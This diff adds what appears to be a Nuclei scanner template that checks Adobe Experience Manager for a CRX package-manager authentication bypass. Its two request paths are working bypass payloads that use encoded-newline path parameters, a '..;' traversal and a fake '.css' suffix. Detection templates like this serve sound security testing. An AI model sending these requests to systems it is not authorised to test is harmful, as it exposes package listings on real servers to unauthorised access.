@@ -1,0 +1,21 @@
+id: aem-crx-auth-bypass
+info:
+  name: Adobe Experience Manager CRX Auth Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass,aem
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true"
+      - "{{BaseURL}}/content/..;/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "buildCount"
+      - type: word
+        part: body
+        words:
+          - "{\"results\":[{"
